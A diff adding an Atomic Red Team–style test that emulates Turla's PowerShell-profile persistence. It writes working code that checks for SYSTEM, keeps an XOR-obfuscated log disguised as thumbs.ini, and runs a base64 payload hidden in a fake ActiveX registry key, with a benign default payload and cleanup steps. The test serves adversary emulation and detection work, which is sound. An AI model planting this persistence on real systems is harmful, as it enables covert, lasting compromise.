@@ -33,3 +33,71 @@ atomic_tests:
       $oldprofile = cat $profile | Select-Object -skiplast 1
       Set-Content $profile -Value $oldprofile
     name: powershell
+- name: Turla Malicious Powershell Profile for Persistence
+  description: |
+    Creates a PowerShell profile that emulates Turla tradecraft observed in the wild. The profile checks
+    if it is running as SYSTEM (S-1-5-18) via WMI, logs execution to an XOR-obfuscated file disguised
+    as a thumbnail cache (C:\Users\Public\Downloads\thumbs.ini), reads a base64-encoded payload from
+    a registry key masquerading as an ActiveX compatibility entry, and executes it via Invoke-Expression.
+
+    Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+  supported_platforms:
+  - windows
+  input_arguments:
+    profile_path:
+      description: Path to the PowerShell profile to create
+      type: path
+      default: $profile
+    benign_payload:
+      description: Benign PowerShell command to base64-encode and store in the registry as the payload
+      type: string
+      default: Get-Date
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Back up the PowerShell profile if it exists
+    prereq_command: |
+      if ((Test-Path "$env:TEMP\T1546.013_profile_backup") -or !(Test-Path "#{profile_path}")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Copy-Item "#{profile_path}" "$env:TEMP\T1546.013_profile_backup" -Force
+  - description: Back up the modified registry key if it exists
+    prereq_command: |
+      $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+      if ((Test-Path "$env:TEMP\T1546013_activex_backup.reg") -or !(Test-Path $regPath)) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      reg export "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}" "$env:TEMP\T1546013_activex_backup.reg" /y
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+      if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+      $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('#{benign_payload}'))
+      Set-Item -Path $regPath -Value $encodedPayload
+      $profileContent = @'
+      try
+      {
+          $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} | % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
+          if ("$SystemProc" -ne "")
+          {
+            $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append
+            [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}').'(Default)')) | iex
+          }
+      }
+      catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_ </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
+      '@
+      New-Item -ItemType Directory -Path (Split-Path "#{profile_path}") -Force
+      Set-Content "#{profile_path}" -Value $profileContent -Force
+      Start-Process powershell.exe -ArgumentList "-Command", "Start-Sleep -Seconds 30" -Wait
+    cleanup_command: |
+      if (Test-Path "$env:TEMP\T1546.013_profile_backup") {
+        Move-Item "$env:TEMP\T1546.013_profile_backup" "#{profile_path}" -Force
+      } else {
+        Remove-Item "#{profile_path}" -Force -ErrorAction SilentlyContinue
+      }
+      $regPath = "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+      reg delete "$regPath" /f 2>&1 | Out-Null
+      if (Test-Path "$env:TEMP\T1546013_activex_backup.reg") {
+        reg import "$env:TEMP\T1546013_activex_backup.reg" 2>&1 | Out-Null
+        Remove-Item "$env:TEMP\T1546013_activex_backup.reg" -Force
+      }
+      Remove-Item "C:\Users\Public\Downloads\thumbs.ini" -Force -ErrorAction SilentlyContinue
